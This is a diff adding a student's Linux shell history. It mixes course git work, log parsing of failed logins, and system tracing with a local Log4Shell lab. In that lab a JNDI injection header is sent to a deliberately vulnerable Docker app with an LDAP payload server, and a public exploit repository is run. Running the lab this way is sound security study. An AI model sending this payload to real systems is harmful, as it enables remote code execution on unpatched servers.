@@ -1,0 +1,1000 @@
+ 1008  sudo hostnamectl set-hostname ASA-Asus
+ 1009  sudo nano /etc/hostname
+ 1010  sudo nano /etc/hosts
+ 1011  sudo reboot
+ 1012  pgrep chrome
+ 1013  pkill chrome
+ 1014  htop
+ 1015  rm ~/.config/google-chrome/*
+ 1016  sudo rm ~/.config/google-chrome/*
+ 1017  killall chrome
+ 1018  killall chromium
+ 1019  rm ~/.config/google-chrome/SingletonLock
+ 1020  git clone https://github.com/AliSheikhAttar/Cryptography.git
+ 1021  cd Code/Git/
+ 1022  cd Cryptography/
+ 1023  git -am "Init HW1,2,3 Slides1,2,3"
+ 1024  git commit -am "Init HW1,2,3 Slides1,2,3"
+ 1025  git add .
+ 1026  git commit -m "Init HW1,2,3 Slides1,2,3"
+ 1027  git push
+ 1028  cd ../Cheat/
+ 1029  ./git.script 
+ 1030  sudo dpkg --add-architecture i386
+ 1031  cat /etc/os-release
+ 1032  sudo mkdir -pm755 /etc/apt/keyrings
+ 1033  sudo wget -O /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key
+ 1034  cat /etc/os-release
+ 1035  sudo wget -NP /etc/apt/sources.list.d/ https://dl.winehq.org/wine-builds/ubuntu/dists/jammy/winehq-jammy.sources
+ 1036  cat /etc/os-release
+ 1037  cd Downloads/
+ 1038  axel -an 8 https://5f8u2z8mn5qjqvfdxs59z5g6aw8djtnew26.kinguploadf2m15.info/aG5p/Film/New-Server/Blue.Valentine.2010.720p.Film9.mkv?md5=Tb7u4pN9n1NwfkOLpZV4Rw&expires=1729016214
+ 1039  sudo mkdir -pm755 /etc/apt/keyrings
+ 1040  sudo wget -O /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key
+ 1041  sudo mkdir -pm755 /etc/apt/keyrings
+ 1042  sudo wget -O /etc/apt/keyrings/winehq-archive.key https://dl.winehq.org/wine-builds/winehq.key
+ 1043  sudo wget -NP /etc/apt/sources.list.d/ https://dl.winehq.org/wine-builds/ubuntu/dists/jammy/winehq-jammy.sources
+ 1044  sudo apt install --install-recommends winehq-stable
+ 1045  sudo apt update
+ 1046  sudo apt install --install-recommends winehq-stable
+ 1047  wine
+ 1048  sudo reboot
+ 1049  cat > Accs
+ 1050  ls
+ 1051  base64 Acc > Acc_Encoded
+ 1052  more Acc_
+ 1053  ls
+ 1054  cd Desktop/
+ 1055  base64 Accs > encodedfile
+ 1056  more encodedfile 
+ 1057  base64 --decode encodedfile > decodedfile
+ 1058  more decodedfile 
+ 1059  vi Accs 
+ 1060  rm encodedfile decodedfile 
+ 1061  base64 Accs > Accz
+ 1062  mv Accs ../Documents/
+ 1063  ./git.script encoding
+ 1064  git clone https://github.com/AliSheikhAttar/Operating_System_Lab.git
+ 1065  mv Session1.pdf Operating_System_Lab/
+ 1066  cd Operating_System_Lab/
+ 1067  mkdir Slides
+ 1068  mv Session1.pdf Slides/
+ 1069  ls
+ 1070  git add .
+ 1071  git status
+ 1072  git commit -m "initial commit"
+ 1073  git push
+ 1074  git pull
+ 1075  cd ..
+ 1076  mv Operating_System_Lab/ Operating_systems_lab
+ 1077  mv Operating_systems_lab/ Operating_system_lab
+ 1078  ls -t
+ 1079  base64 --decode Acc_Encoded > decodedfile
+ 1080  man touch 
+ 1081  mkdir ~/Desktop/mydir
+ 1082  clr
+ 1083  clear
+ 1084  rm -rf ~/Desktop/mydir/
+ 1085  clear
+ 1086  mkdir Desktop/mydir
+ 1087  ls mydir
+ 1088  rm -rf Desktop/mydir/
+ 1089  cleaer
+ 1090  clear
+ 1091  mkdir Desktop/mydir
+ 1092  ls Desktop/mydir
+ 1093  ls Desktop/ -t
+ 1094  clear
+ 1095  mkdir Desktop/mydir
+ 1096  rm -rf Desktop/mydir/
+ 1097  clear
+ 1098  mkdir Desktop/mydir
+ 1099  ls -t
+ 1100  rm -rf Desktop/mydir
+ 1101  clear
+ 1102  mkdir Desktop/mydir
+ 1103  chmod 774 Desktop/mydir/
+ 1104  groups
+ 1105  sudo chgrp asa Desktop/mydir/
+ 1106  touch myfile.txt
+ 1107  touch -a -d "yesterday 7am" myfile.txt
+ 1108  [200~ls -l --time=atime myfile.txt
+ 1109  ls -l --time=atime myfile.txt
+ 1110  mkdir test_dir
+ 1111  cd test_dir/
+ 1112  mkdir emptydir1 emptydir2 emptydir3
+ 1113  ls
+ 1114  find . -type f -empty -delete
+ 1115  ls
+ 1116  file emptydir
+ 1117  file emptydir1
+ 1118  find . -type d -empty -delete
+ 1119  ls
+ 1120  clar
+ 1121  cler
+ 1122  clear
+ 1123  mkdir testdir1 testdir2
+ 1124  touch testdir1/testfile3 testdir2/testfile1 testdir1/testfile2
+ 1125  ls
+ 1126  ls -r
+ 1127  ls -R
+ 1128  find . -type f -empty -delete
+ 1129  ls -R
+ 1130  ls -h
+ 1131  man ls
+ 1132  cd Desktop/
+ 1133  ls *mydir*
+ 1134  ls *mydir
+ 1135  ls mydir*
+ 1136  ls myd*
+ 1137  ls my*
+ 1138  ls
+ 1139  ls -t
+ 1140  ls my
+ 1141  ls my*
+ 1142  ls
+ 1143  ls "mydir"
+ 1144  touch -d "yesterday 7am" myfile_text
+ 1145  ls -l --time=atime myfile_text 
+ 1146  pkil hidify
+ 1147  pkill hidify
+ 1148  pkill hiddify
+ 1149  sudo virtualbox
+ 1150  htop
+ 1151  pkill shell
+ 1152  pkill
+ 1153  htop
+ 1154  pkill hiddify
+ 1155  htop
+ 1156  ent
+ 1157  net
+ 1158  clr
+ 1159  clear
+ 1160  cd Code/Git/Network_Lab/
+ 1161  open .
+ 1162  cp MininetVM.vdi Code/Git/Network_Lab/
+ 1163  pwr
+ 1164  pwd
+ 1165  editor
+ 1166  virtualbox
+ 1167  sudo virtualbox
+ 1168  sudo mn
+ 1169  sudo mininet
+ 1170  sudo virtualbox
+ 1171  docker --version
+ 1172  docker network inspect
+ 1173  docker network inspect log4jnetwork 
+ 1174  sudo perflist
+ 1175  sudo perf list
+ 1176  docker network ls
+ 1177  docker image ls
+ 1178  docker ps
+ 1179  pkill hidi
+ 1180  pkill hiddify
+ 1181  clear
+ 1182  docker network create log4jnetwork
+ 1183  docker run --rm --network log4jnetwork --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+ 1184  docker network create log4jnetwork
+ 1185  docker exec vulnerable-app ls /tmp
+ 1186  curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'
+ 1187  docker exec vulnerable-app ls /tmp
+ 1188  docker network ls
+ 1189  docker network inspect
+ 1190  docker network inspect log4jnetwork
+ 1191  ifconfig
+ 1192  docker run --rm --network log4jnetwork --name log4jldapserver -p 1389:1389 -p 8888:8888 cygenta/log4jldap
+ 1193  docker network inspect log4jnetwork 
+ 1194  sudo perf record -ae 'syscalls:*' -p 20120
+ 1195  strace -p 20120
+ 1196  sudo strace -p 20120 -f
+ 1197  htop
+ 1198  pgrep docker
+ 1199  ps -aux | grep docker
+ 1200  curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'
+ 1201  docker exec vulnerable-app ls \tmp
+ 1202  docker exec vulnerable-app touch \tmp\newtest
+ 1203  docker exec vulnerable-app touch newtest
+ 1204  docker exec vulnerable-app bash
+ 1205  docker exec vulnerable-app bin/bash
+ 1206  docker exec vulnerable-app /bin/bash
+ 1207  docker exec -it vulnerable-app /bin/bash
+ 1208  docker exec -it vulnerable-app ssh
+ 1209  docker exec -it vulnerable-app /bin/sh
+ 1210  docker run --rm --network log4jnetwork --name log4jldapserver -p 1389:1389 -p 8888:8888 cygenta/log4jldap
+ 1211  docker run --rm --network log4jnetwork --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+ 1212  mkdir React
+ 1213  cd React/
+ 1214  cat README.md
+ 1215  cat > README.md
+ 1216  cd Downloads/
+ 1217  axel -an 8 https://dlmoovie.ir/content/download/b66043e5-7de9-4a89-fbcc-08daace14082/f35806bd-edad-400b-bc09-259767f6b7e9/HSHD720
+ 1218  man cut
+ 1219  cd Desktop/
+ 1220  mkdir HW3
+ 1221  cd HW3/
+ 1222  cat > ~/grade.txt << EOF
+ 1223  Student\tSubject\tGrade\tRemarks
+ 1224  John\tMath\t85\tGood
+ 1225  Jane\tHistory\t90\tExcellent
+ 1226  Alice\tScience\t75\tSatisfactory
+ 1227  Bob\tEnglish\t88\tGood
+ 1228  EOF
+ 1229  rm ~/grade.txt 
+ 1230  cat > grade.txt
+ 1231  Student\tSubject\tGrade\tRemarks
+ 1232  John\tMath\t85\tGood
+ 1233  Jane\tHistory\t90\tExcellent
+ 1234  Alice\tScience\t75\tSatisfactory
+ 1235  Bob\tEnglish\t88\tGood
+ 1236  cat > grade.txt
+ 1237  cat grade.txt 
+ 1238  cat -e grade.txt 
+ 1239  echo -e grade.txt 
+ 1240  clear
+ 1241  head -n 10 /etc/passwd
+ 1242  clear
+ 1243  rm grade.txt 
+ 1244  cleat
+ 1245  clear
+ 1246  echo -e "Student\tSubject\tGrade\tRemarks" > ~/grade.txt
+ 1247  echo -e "John\tMath\t85\tGood" >> ~/grade.txt
+ 1248  echo -e "Jane\tHistory\t90\tExcellent" >> ~/grade.txt
+ 1249  echo -e "Alice\tScience\t75\tSatisfactory" >> ~/grade.txt
+ 1250  echo -e "Bob\tEnglish\t88\tGood" >> ~/grade.txt
+ 1251  cat ~/grade.txt 
+ 1252  [200~echo -e "Monday\nTuesday\nWednesday\nThursday\nFriday\nSaturday\nSunday" > ~/test.txt
+ 1253  cat /etc/passwd >> ~/test.txt
+ 1254  clear
+ 1255  echo -e "Monday\nTuesday\nWednesday\nThursday\nFriday\nSaturday\nSunday" > ~/test.txt
+ 1256  cat /etc/passwd >> ~/test.txt
+ 1257  cat ~/test.txt 
+ 1258  rm ~/test.txt 
+ 1259  clear
+ 1260  echo -e "Monday\nTuesday\nWednesday\nThursday\nFriday\nSaturday\nSunday" > ~/test.txt
+ 1261  cat /etc/passwd >> ~/test.txt
+ 1262  cat ~/test.txt 
+ 1263  clear
+ 1264  ls /etc/ | grep init
+ 1265  clear
+ 1266  head -n 10 /etc/passwd | cut -d ':' -f 1
+ 1267  clear
+ 1268  tail -n 10 /etc/group | cut -d ':' -f 1 | wc -c
+ 1269  man cut
+ 1270  clear
+ 1271  head -n 10 /etc/passwd | cut -d ':' --ouput-delimeter='*'
+ 1272  clear
+ 1273  head -n 10 /etc/passwd | cut -d ':' --output-delimeter='*'
+ 1274  clear
+ 1275  head -n 10 /etc/passwd | cut -d ':' --output-delimiter='*'
+ 1276  clear
+ 1277  head -n 10 /etc/passwd | cut -d ':' -f 1:7 --output-delimiter='*'
+ 1278  clear
+ 1279  head -n 10 /etc/passwd | cut -d ':' -f 1::7 --output-delimiter='*'
+ 1280  cut --help
+ 1281  man cut
+ 1282  clear
+ 1283  head -n 10 /etc/passwd | cut -d ':' -f 1-7 --output-delimiter='*'
+ 1284  head -n 10 /etc/passwd | cut -d ':' -f 1-7 --output-delimiter=' '
+ 1285  ls -type f \etc\ | grep init
+ 1286  clear
+ 1287  ls \etc\*init*
+ 1288  clear
+ 1289  ls /etc/*init*
+ 1290  ls /etc/*init* | grep init
+ 1291  more /etc/group
+ 1292  clear
+ 1293  find /etc/ -type f | grep *init*
+ 1294  clear
+ 1295  find /etc/ -type f | grep *init*
+ 1296  sudo find /etc/ -type f | grep *init
+ 1297  sudo find /etc/ -type f | grep init
+ 1298  type /etc/init.d
+ 1299  cd /etc/
+ 1300  cd /init.d
+ 1301  ls -a
+ 1302  man find
+ 1303  cat > .gitignore
+ 1304  git status
+ 1305  git add .
+ 1306  git commit -m "gitignore"
+ 1307  git push
+ 1308  git clone https://github.com/AliSheikhAttar/Microprocessors_Lab.git
+ 1309  cd Microprocessors_Lab/
+ 1310  cat README.md
+ 1311  cat > README.md
+ 1312  vi README.md 
+ 1313  git add .
+ 1314  git push -m "HW1,2"
+ 1315  git commit  -m "HW1,"
+ 1316  git push
+ 1317  sudo telinit 0
+ 1318  ./git.script REACT
+ 1319  git status
+ 1320  ./git.script REACT
+ 1321  pkill hiddify
+ 1322  cat > CV.tex
+ 1323  more CV.tex 
+ 1324  ./git.script cyber
+ 1325  Last
+ 1326  last
+ 1327  pkill hiddify
+ 1328  ./git.script mininet
+ 1329  cd Code/Git/
+ 1330  cd Network_Lab/
+ 1331  ls
+ 1332  cd share/
+ 1333  ls
+ 1334  more lab1.py 
+ 1335  cd ..
+ 1336  mkdir HWs
+ 1337  touch codes.md
+ 1338  code codes.md 
+ 1339  rm codes.md 
+ 1340  cd ../Cheat/
+ 1341  cd Linux/Network/
+ 1342  ls
+ 1343  more Network.md 
+ 1344  clear
+ 1345  CDN
+ 1346  code CDN.md
+ 1347  cd ..
+ 1348  code .
+ 1349  cd ..
+ 1350  code .
+ 1351  clear
+ 1352  docker network inspect log4jnetwork 
+ 1353  ifconfig
+ 1354  clear
+ 1355  curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'
+ 1356  htop
+ 1357  touch djskl.s
+ 1358  sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf(\"Command executed: PID %d, Comm %s, Filename %s\\n\", pid, comm, str(args->filename)); }'"
+ 1359  sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf(\"Command executed: PID %d, Comm %s, Filename %s\\n\", pid, comm, str(args->filename)); }'
+ 1360  sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("Command executed: PID %d, Comm %s, Filename %s\n", pid, comm, str(args->filename)); }'
+ 1361  docker run --rm --network log4jnetwork --name log4jldapserver -p 1389:1389 -p 8888:8888 cygenta/log4jldap
+ 1362  docker exec vulnerable-app ls /tmp
+ 1363  docker exec vulnerable-app bash
+ 1364  docker exec vulnerable-app history
+ 1365  docker exec vulnerable-app /bin/bash
+ 1366  docker exec -it vulnerable-app /bin/bash
+ 1367  docker exec -it vulnerable-app /bin/sh
+ 1368  docker exec -it vulnerable-app sh
+ 1369  docker network inspect log4jnetwork 
+ 1370  curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'
+ 1371  ss -p
+ 1372  ss -p | grep 8080
+ 1373  netstat
+ 1374  ss -np | 8080
+ 1375  ss -np | grep 8080
+ 1376  ss -np 
+ 1377  ss -np | grep 8080
+ 1378  ss -np | grep 1389
+ 1379  ss -np | grep 8888
+ 1380  ss -anp | grep 8888
+ 1381  ss -anp | grep 8080
+ 1382  ss -anp | less
+ 1383  ss -anp | grep 8080
+ 1384  ls
+ 1385  open .
+ 1386  cd /
+ 1387  ls
+ 1388  find -type d -name="docker"
+ 1389  find -type d --name="docker"
+ 1390  find -type d | grep docker
+ 1391  docker network ls
+ 1392  clear
+ 1393  docker run --rm --network log4jnetwork --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+ 1394  sudo dpkg -i ./tradingview_amd64.deb 
+ 1395  cat >> .gitignore
+ 1396  vi .gitignore
+ 1397  git status
+ 1398  git add .
+ 1399  git commit -m "gitignore & HW"
+ 1400  git push
+ 1401  chmod +x ./arduino-ide_2.3.3_Linux_64bit.AppImage 
+ 1402  sudo chmod +x ./arduino-ide_2.3.3_Linux_64bit.AppImage 
+ 1403  sudo ./arduino-ide_2.3.3_Linux_64bit.AppImage 
+ 1404  ./arduino-ide_2.3.3_Linux_64bit.AppImage 
+ 1405  sudo apt remove tradingview 
+ 1406  sudo apt-get purge tradingview 
+ 1407  sudo apt autoremove
+ 1408  git clone https://github.com/AliSheikhAttar/Trade.git
+ 1409  cd Trade/
+ 1410  mkdir HWs
+ 1411  cd HWs/
+ 1412  mkdir 1
+ 1413  cd 1/
+ 1414  cd ..
+ 1415  mkdir concepts
+ 1416  code .
+ 1417  git clone https://github.com/AliSheikhAttar/Embedded_Systems.git
+ 1418  vi Des.md
+ 1419  code .
+ 1420  cat > README.md
+ 1421  vi README.md 
+ 1422  mv ~/Downloads/arduino-ide_2.3.3_Linux_64bit.AppImage .
+ 1423  git add .
+ 1424  git commit -m "inital"
+ 1425  git push
+ 1426  cat > .gitignore
+ 1427  git add .
+ 1428  git commit -m "gitignore"
+ 1429  git status
+ 1430  git branch --unset-upstream
+ 1431  git status
+ 1432  ls
+ 1433  vi README.md 
+ 1434  git status
+ 1435  gti add .
+ 1436  git add .
+ 1437  git commit -m "initial"
+ 1438  git push
+ 1439  git push --set-upstream origin main
+ 1440  git del arduino-ide_2.3.3_Linux_64bit.AppImage
+ 1441  git rm arduino-ide_2.3.3_Linux_64bit.AppImage
+ 1442  git status
+ 1443  git add .
+ 1444  git commit -m "initial"
+ 1445  git push
+ 1446  git commit -m "initial"
+ 1447  git rm arduino-ide_2.3.3_Linux_64bit.AppImage
+ 1448  git push --set-upstream origin main
+ 1449  git status
+ 1450  git push
+ 1451  git push --set-upstream origin main
+ 1452  git push
+ 1453  git push --set-upstream origin main
+ 1454  git status
+ 1455  git push --set-upstream origin main
+ 1456  git reseet
+ 1457  git reset
+ 1458  git status
+ 1459  git revert
+ 1460  git revert --aport
+ 1461  git revert --abort
+ 1462  git push
+ 1463  git push --set-upstream origin main
+ 1464  code .
+ 1465  alias CD='cd Code/Git/'
+ 1466  CD
+ 1467  wc -c sas
+ 1468  "asas" | wc 
+ 1469  wc -c "dsfdds"
+ 1470  #fjdsla
+ 1471  $(#fjdsla)
+ 1472  lastb -4
+ 1473  sudo lastb -4
+ 1474  shutdown
+ 1475  shutdown -c
+ 1476  shutdown -h
+ 1477  shutdown -c
+ 1478  shutdown -H
+ 1479  shutdown -c
+ 1480  last -4
+ 1481  last -4 | cut -d "    " 
+ 1482  last -4 | cut -d " " 
+ 1483  last -4 | cut -d' ' -f1 
+ 1484  last -4 
+ 1485  last -4 | cut -d' ' -f1 | head -n 4
+ 1486  last -4 | cut -d' ' -f1 | head -n 4 | wc -c
+ 1487  last -4 | cut -d' ' -f1 | head -n 4 | wc -c | while read user; do echo "$user: $(echo -n $user | wc -c) حرف"done
+ 1488  last -4 | cut -d' ' -f1 | head -n 4 | wc -c | while read user; do echo "$user: $(echo -n $user | wc -c) حرف" done
+ 1489  last -4 | cut -d' ' -f1 | head -n 4 | wc -c | while read line; do echo -n "$line" | wc -c; done 
+ 1490  last -4 | cut -d' ' -f1 | head -n 4 | wc -c | while read user; do echo -n "$user" | wc -c; done 
+ 1491  for user in $(last -n 4 | cut -d' ' -f1 | head -n 4); do echo "$user: ${#user} characters"; done
+ 1492  for user in $(last -n 4 | cut -d' ' -f1 | head -n 4); do echo "$user: have $(echo user) characters"; done
+ 1493  for user in $(last -n 4 | cut -d' ' -f1 | head -n 4); do echo "$user: have $(echo $user) characters"; done
+ 1494  for user in $(last -n 4 | cut -d' ' -f1 | head -n 4); do echo "$user: have $(echo $user | wc -c) characters"; done
+ 1495  for user in $(last -n 4 | cut -d'  ' -f1 | head -n 4); do echo "$user: have $(echo $user | wc -c) characters"; done
+ 1496  for user in $(last -n 4 | cut -d' ' -f1 | head -n 4); do echo "$user: have $(echo $user | cut -d ' ' -f1 | wc -c) characters"; done
+ 1497  for user in $(last -n 4 | cut -d' ' -f1 | head -n 4); do echo "$user: have $(echo $user |  wc -c) characters"; done
+ 1498  sudo lastb
+ 1499  sudo grep "Failed password" /var/log/auth.log
+ 1500  sudo cat /var/log/auth.log
+ 1501  sudo cat /var/log/auth.log | grep "Failed"
+ 1502  sudo last -f /var/log/btmp
+ 1503  sudo journalctl _COMM=sshd | grep "Failed password"
+ 1504  sudo cat /var/log/auth.log
+ 1505  sudo open /var/log/auth.log
+ 1506  cat > random_sentences
+ 1507  read -p "enter the word number" word_number
+ 1508  while read -r line; do   echo "$line" | cut -d' ' -f$word_number; done < random_sentences 
+ 1509  hostname
+ 1510  sudo hostname new_ASA_Asus
+ 1511  sudo hostname "new_ASA_Asus"
+ 1512  man grep
+ 1513  sudo cat /var/log/auth.log
+ 1514  sudo open /var/log/auth.log
+ 1515  cat random_sentences 
+ 1516  grep "ali" random_sentences 
+ 1517  grep "h*a" random_sentences 
+ 1518  grep "he*a" random_sentences 
+ 1519  grep -P "he*a" random_sentences 
+ 1520  grep -P "he\*a" random_sentences 
+ 1521  grep -F "he\*a" random_sentences 
+ 1522  grep -e "he\*a" random_sentences 
+ 1523  grep -e "h*a" random_sentences 
+ 1524  grep -e "h?e*a" random_sentences 
+ 1525  grep -e "h*e*a" random_sentences 
+ 1526  sudo cat /var/log/auth.log | grep authentication failure
+ 1527  sudo cat /var/log/auth.log | grep "authentication failure"
+ 1528  sudo cat /var/log/auth.log | grep "gdm-password*authentication failure"
+ 1529  sudo cat /var/log/auth.log | grep "*gdm-password*authentication failure*"
+ 1530  sudo cat /var/log/auth.log | grep *gdm-password*authentication failure*
+ 1531  sudo cat /var/log/auth.log | grep "authentication failure"
+ 1532  sudo cat /var/log/auth.log | grep "gdm-password"
+ 1533  sudo cat /var/log/auth.log | grep "gdm-password*"
+ 1534  sudo cat /var/log/auth.log | grep "^gdm-password*"
+ 1535  sudo cat /var/log/auth.log | grep "*S^gdm-password*"
+ 1536  sudo cat /var/log/auth.log | grep "*gdm-password*"
+ 1537  sudo cat /var/log/auth.log | grep "gdm-password*"
+ 1538  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password"
+ 1539  sudo cat /var/log/auth.log | grep "ASA-ASUS?gdm-password"
+ 1540  sudo cat /var/log/auth.log | grep "ASA-ASUS*gdm-password"
+ 1541  sudo cat /var/log/auth.log | grep "ASA-ASUS\*gdm-password"
+ 1542  sudo cat /var/log/auth.log | grep -G "ASA-ASUS*gdm-password"
+ 1543  sudo cat /var/log/auth.log | grep -G "ASA-ASUS?gdm-password"
+ 1544  sudo cat /var/log/auth.log | grep -G "ASA-ASUS gdm-password"
+ 1545  sudo cat /var/log/auth.log | grep -e "ASA-ASUS gdm-password"
+ 1546  sudo cat /var/log/auth.log | grep -e "ASA-ASUS*gdm-password"
+ 1547  sudo cat /var/log/auth.log | grep -e "ASA-ASUS?gdm-password"
+ 1548  sudo cat /var/log/auth.log | grep "ASA-ASUS?gdm-password"
+ 1549  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password"
+ 1550  sudo cat /var/log/auth.log | grep "ASA-ASUS\?gdm-password"
+ 1551  sudo cat /var/log/auth.log | grep -e "ASA-ASUS\?gdm-password"
+ 1552  sudo cat /var/log/auth.log | grep -F "ASA-ASUS?gdm-password"
+ 1553  pattern="ASA-ASUS\?gdm-password"
+ 1554  sudo grep "$pattern" /var/log/auth.log
+ 1555  pattern="ASA-ASUS gdm-password"
+ 1556  sudo grep "$pattern" /var/log/auth.log
+ 1557  grep -P "ASA-ASUS\?gdm-password" /var/log/auth.log
+ 1558  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password"
+ 1559  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication"
+ 1560  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure"
+ 1561  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4
+ 1562  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d"user="
+ 1563  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f1
+ 1564  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2
+ 1565  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f0
+ 1566  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f2
+ 1567  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f3
+ 1568  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f4
+ 1569  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f5
+ 1570  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f6
+ 1571  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f7
+ 1572  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f9
+ 1573  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f9
+ 1574  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f11
+ 1575  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f12
+ 1576  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f13
+ 1577  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f15
+ 1578  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f16
+ 1579  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f17
+ 1580  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f15
+ 1581  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d" " -f14
+ 1582  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f7
+ 1583  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f6
+ 1584  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f9
+ 1585  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f9 | cut -d"=" -f2
+ 1586  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f9 | cut -d"=" -f2 | cut -d"]" -f1
+ 1587  sudo cat /var/log/auth.log | grep "ASA-ASUS gdm-password" | grep "authentication failure" | tail -n 4 | cut -d";" -f2 | cut -d" " -f9 | cut -d"=" -f2 | cut -d"]" -f1 > badlogins.txt
+ 1588  wc -lw badlogins.txt 
+ 1589  cat badlogins.txt 
+ 1590  clear
+ 1591  read -p "Enter the new name for system\ " new_hostname
+ 1592  sudo hostnamectl set-hostname $new_hostname
+ 1593  clear
+ 1594  read -p "Enter the new name for system: " new_hostname
+ 1595  sudo hostnamectl set-hostname $new_hostname
+ 1596  hostname
+ 1597  CD
+ 1598  cd Code/Git/Microprocessors_Lab/
+ 1599  ls
+ 1600  cd HW1
+ 1601  ls
+ 1602  cd ../HW2/
+ 1603  ls
+ 1604  cd MicroprocessorsLab-HW2/
+ 1605  ls
+ 1606  cd ..
+ 1607  cd HW1
+ 1608  ls
+ 1609  cd AssemblerApplication1/
+ 1610  ls
+ 1611  cd ..
+ 1612  ls
+ 1613  mv ~/Downloads/Telegram\ Desktop/HW3.zip .
+ 1614  open .
+ 1615  cat > .gitignore
+ 1616  git add .
+ 1617  git commit -m "HW1,2,3"
+ 1618  git push
+ 1619  htop
+ 1620  code .
+ 1621  sudo perf stat -ae 'kmem:*'
+ 1622  perf list
+ 1623  sudo perf list | grep kmem
+ 1624  sudo perf stat -ae 'kmem:kfree'
+ 1625  sudo perf stat -ae kmem:kfree
+ 1626  sudo apt update
+ 1627  sudo apt install libtraceevent1 libtraceevent-dev
+ 1628  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1629  clear
+ 1630  cd Code/Git/log4j-log4shell-exploit/
+ 1631  ./mvnw exec:java -D"exec.mainClass"="de.predic8.LdapServer"
+ 1632  cd log4j-log4shell-exploit/
+ 1633  ./mvnw exec:java -D"exec.mainClass"="de.predic8.HttpServer"
+ 1634  git clone https://github.com/predic8/log4j-log4shell-exploit
+ 1635  cd log4j-log4shell-exploit
+ 1636  ./mvnw package
+ 1637  ./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
+ 1638  ./mvnw package
+ 1639  ./mvnw exec:java -D"exec.mainClass"="de.predic8.Opfer"
+ 1640  sudo netstat -tuln
+ 1641  sudo lsof -i :<port_number>
+ 1642  sudo lsof -i :53
+ 1643  sudo kill 698
+ 1644  sudo lsof -i :389
+ 1645  sudo kill -9 2015
+ 1646  sudo kill -9 698
+ 1647  sudo lsof -i :80
+ 1648  sudo kill -9 971 977 978
+ 1649  sudo lsof -i :80
